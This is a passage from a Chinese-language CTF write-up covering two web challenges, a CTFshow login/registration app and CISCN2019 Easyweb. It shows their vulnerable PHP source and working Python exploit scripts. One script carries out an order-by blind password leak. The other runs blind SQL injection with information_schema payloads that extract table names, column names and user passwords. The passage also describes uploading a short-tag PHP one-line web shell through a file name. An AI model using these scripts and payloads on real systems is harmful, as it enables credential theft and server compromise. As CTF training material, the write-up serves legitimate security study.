<p>index.php（略）</p>
<p>login.php</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
		<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"web15"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Could not connect: '</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
		<span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
			<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/group|union|select|from|or|and|regexp|substr|like|create|drop|\,|\`|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\_|\+|\=|\]|\;|\'|\’|\“|\"|\&lt;|\>|\?/i"</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
				<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select pwd from user where uname = '<span class="token interpolation"><span class="token variable">$username</span></span>' limit 1"</span><span class="token punctuation">;</span>
			<span class="token variable">$res</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pwd'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
				<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
				<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:/user_main.php?order=id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
				<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:/index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
			<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:/index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>

<span class="token delimiter important">?></span></span></code></pre>

<p>reg.html（略）</p>
<p>reg.php</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
		<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"web15"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Could not connect: '</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
		<span class="token variable">$username</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$password</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$email</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'email'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token variable">$nickname</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'nickname'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/group|union|select|from|or|and|regexp|substr|like|create|drop|\`|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\_|\+|\=|\]|\;|\'|\’|\“|\"|\&lt;|\>|\?/i"</span><span class="token punctuation">,</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
				<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/group|union|select|from|or|and|regexp|substr|like|create|drop|\`|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\_|\+|\=|\]|\;|\'|\’|\“|\"|\&lt;|\>|\?/i"</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
				<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/group|union|select|from|or|and|regexp|substr|like|create|drop|\`|\!|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\=|\&#123;|\&#125;\]|\'|\’|\“|\"|\&lt;|\>|\?/i"</span><span class="token punctuation">,</span><span class="token variable">$email</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
				<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/group|union|select|from|or|and|regexp|substr|like|create|drop|\`|\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\=|\&#123;|\&#125;|\]|\;|\'|\’|\“|\"|\&lt;|\>|\?/i"</span><span class="token punctuation">,</span><span class="token variable">$nickname</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
				<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$email</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$nickname</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
			<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"INSERT INTO user (uname, pwd, email,nname) VALUES ('<span class="token interpolation"><span class="token variable">$username</span></span>', '<span class="token interpolation"><span class="token variable">$password</span></span>', '<span class="token interpolation"><span class="token variable">$email</span></span>','<span class="token interpolation"><span class="token variable">$nickname</span></span>')"</span><span class="token punctuation">;</span>
            <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
				<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
				<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"location:/index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span> 
		<span class="token punctuation">&#125;</span>
		<span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		

<span class="token delimiter important">?></span></span></code></pre>

<p>user_main.php</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span>
<span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>CTFshow_web<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
..........<span class="token punctuation">(</span>css<span class="token punctuation">)</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
	
	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"web15"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Could not connect: '</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
		<span class="token variable">$order</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$order</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$order</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
			<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/group|union|select|from|or|and|regexp|substr|like|create|drop|\,|\`|\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\=|\&#123;|\&#125;|\[|\]|\;|\:|\'|\’|\“|\"|\&lt;|\>|\?|\,|\.|\?/i"</span><span class="token punctuation">,</span><span class="token variable">$order</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
				<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select * from user order by <span class="token interpolation"><span class="token variable">$order</span></span>"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select * from user order by id"</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>   

<span class="token delimiter important">?></span></span>
..........(html)
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>

<p>可以看到可传入的值都经过了严格的过滤，大多数特殊符号都被过滤，所以直接进行sql注入显然不可能，寻找其他的入手点，可以看到在<code>user_main.php</code>的传入的<code>order</code>值处，有一条<code>order by</code>语句，是用来根据<code>order by</code>后面的列来进行排序的，根据题目提示<code>flag_is_my_password</code>，所以我们只需要得到用户<code>flag</code>的密码即可，于是我们可以根据<code>pwd</code>的值来排序，然后配合盲注得出<code>flag</code>，我们注册不同密码的账号，原理假设密码为<code>e</code>（前端有个<code>md5</code>加密抓包可以直接绕过不影响），如果<code>flag</code>的密码为<code>flag&#123;xxxxx&#125;</code>那么<code>e</code>&lt;<code>flag&#123;xxxxx&#125;</code>，再传入<code>user_main.php?order=pwd</code>，那么密码为<code>e</code>的这一行就在flag这一行的上面。而如果注册一个密码为<code>g</code>的用户，则密码为<code>g</code>的用户的这一行则会在<code>flag</code>这一行的下面，于是就可以拿来进行盲注比较得出<code>flag</code>的所有值</p>
<p>exp</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
url <span class="token operator">=</span> <span class="token string">"https://b51823a7-b1c0-499d-878a-8a5b296655d3.chall.ctf.show"</span>
urlreg <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/reg.php"</span>  <span class="token comment">#注册 必须要是可传参php文件</span>
urllogin <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/login.php"</span>  <span class="token comment">#登录 必须要是可传参php文件</span>
urlorder <span class="token operator">=</span> url <span class="token operator">+</span> <span class="token string">"/user_main.php?order=pwd"</span>  <span class="token comment"># 显示</span>

s <span class="token operator">=</span> <span class="token string">"-.0123456789:abcdefghijklmnopqrstuvwxyz&#123;|&#125;~"</span>  <span class="token comment"># 按照ascii码表的字符串大小排序</span>
flag <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> s<span class="token punctuation">:</span>
        exp <span class="token operator">=</span> <span class="token string">""</span>
        exp <span class="token operator">=</span> flag <span class="token operator">+</span> j
        datereg <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"username"</span><span class="token punctuation">:</span>exp<span class="token punctuation">,</span>  <span class="token comment"># 仔细观察username和password并没有对-和&#123;&#125;进行过滤</span>
            <span class="token string">"email"</span><span class="token punctuation">:</span><span class="token string">"zzz"</span><span class="token punctuation">,</span>
            <span class="token string">"nickname"</span><span class="token punctuation">:</span><span class="token string">"zzz"</span><span class="token punctuation">,</span>
            <span class="token string">"password"</span><span class="token punctuation">:</span>exp
        <span class="token punctuation">&#125;</span>
        datelogin <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
            <span class="token string">"username"</span><span class="token punctuation">:</span>exp<span class="token punctuation">,</span>
            <span class="token string">"password"</span><span class="token punctuation">:</span>exp
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>exp <span class="token operator">==</span> <span class="token string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># 当注册的用户名字为flag的时候，因为已经存在flag用户在，额直接打印flag跳过后面的语句的执行</span>
            flag <span class="token operator">=</span> <span class="token string">'flag'</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        session <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 保持会话</span>
        reg <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>urlreg<span class="token punctuation">,</span> datereg<span class="token punctuation">)</span>
        login <span class="token operator">=</span> session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>urllogin<span class="token punctuation">,</span> datelogin<span class="token punctuation">)</span>
        a <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span>urlorder<span class="token punctuation">)</span>
        txt <span class="token operator">=</span> a<span class="token punctuation">.</span>text
        <span class="token keyword">if</span> <span class="token punctuation">(</span>txt<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">"&lt;td>"</span><span class="token operator">+</span>exp<span class="token operator">+</span><span class="token string">"&lt;/td>"</span><span class="token punctuation">)</span><span class="token operator">></span>txt<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">"&lt;td>flag@ctf.show&lt;/td>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment"># index返回字符串被找到到最小的索引（最左）</span>
            flag <span class="token operator">=</span> flag <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>   <span class="token comment"># 得到的字符为比flag的单个字符的值大1，所以需要-1</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
            <span class="token keyword">break</span></code></pre>

<p>最终得到到flag</p>
<h3 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="CISCN2019-总决赛-Day2-Web1-Easyweb"></a>CISCN2019-总决赛-Day2-Web1-Easyweb</h3><p>robots.txt内容如下</p>
<pre class="language-none"><code class="language-none">User-agent: *
Disallow: *.php.bak</code></pre>

<p>于是找<code>.bak</code>文件，发现存在image.php.bak，下载下来后得到image.php的源码如下:</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string double-quoted-string">"config.php"</span><span class="token punctuation">;</span>

<span class="token variable">$id</span><span class="token operator">=</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>
<span class="token variable">$path</span><span class="token operator">=</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>

<span class="token variable">$id</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$path</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$id</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\\0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"%00"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\\'"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$path</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\\0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"%00"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\\'"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"select * from images where id='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$id</span><span class="token punctuation">&#125;</span></span>' or path='<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$path</span><span class="token punctuation">&#125;</span></span>'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span><span class="token constant">MYSQLI_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$path</span><span class="token operator">=</span><span class="token string double-quoted-string">"./"</span> <span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: image/jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>

<p>发现存在sql注入，通过传入id为<code>\\0</code>来转义id后面的引号，与path前面的引号闭合导致sql注入</p>
<p>exp如下：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://a371750a-b2b0-4f95-9c4f-c2cf5292c17c.node3.buuoj.cn/image.php"</span>
result <span class="token operator">=</span> <span class="token string">""</span>

<span class="token comment"># ?id=\\\\0&amp;path= or if(ascii(mid((select database()),&#123;&#125;,1))?&#123;&#125;,1,0)--+</span>
<span class="token comment"># ?id=\\\\0&amp;path= or if(ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))>&#123;&#125;,1,0)--+  images,users</span>
<span class="token comment"># ?id=\\\\0&amp;path= or if(ascii(mid((select group_concat(column_name) from information_schema.columns where table_name=database()),&#123;&#125;,1))>&#123;&#125;,1,0)--+  username,password</span>
<span class="token comment"># ?id=\\\\0&amp;path= or if(ascii(mid((select group_concat(password) from users),&#123;&#125;,1))>&#123;&#125;,1,0)--+   8e97f11c1585e0f6dedb</span>
<span class="token comment"># ?id=\\\\0&amp;path= or if(ascii(mid((select group_concat(username) from users),&#123;&#125;,1))>&#123;&#125;,1,0)--+   admin</span>
payload <span class="token operator">=</span> <span class="token string">"?id=\\\\0&amp;path= or if(ascii(mid((select group_concat(password) from users),&#123;&#125;,1))>&#123;&#125;,1,0)--+"</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    high <span class="token operator">=</span> <span class="token number">127</span>
    low <span class="token operator">=</span> <span class="token number">32</span>
    mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
    <span class="token keyword">while</span> high <span class="token operator">></span> low<span class="token punctuation">:</span>
        payloads <span class="token operator">=</span> payload<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span>
        <span class="token comment"># print(url + payloads)</span>
        html <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payloads<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">'JFIF'</span> <span class="token keyword">in</span> html<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            high <span class="token operator">=</span> mid
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
    result <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre>

<p>得到admin的密码登录后是一个文件上传的页面，上传的文件会自动生成一个日志并且告诉了我们路径且后缀为php文件，上传后打开界面会显示文件的名字，于是抓包将文件名改为一句话木马，上传后php就会解析这个页面里的php语法，但是文件名字不能有php在里面，于是就需要一句话的短标签版，前提需要PHP开启短标签即<code>short_open_tag=on</code>，题目支持，随后<code>cat /flag</code>即可</p>
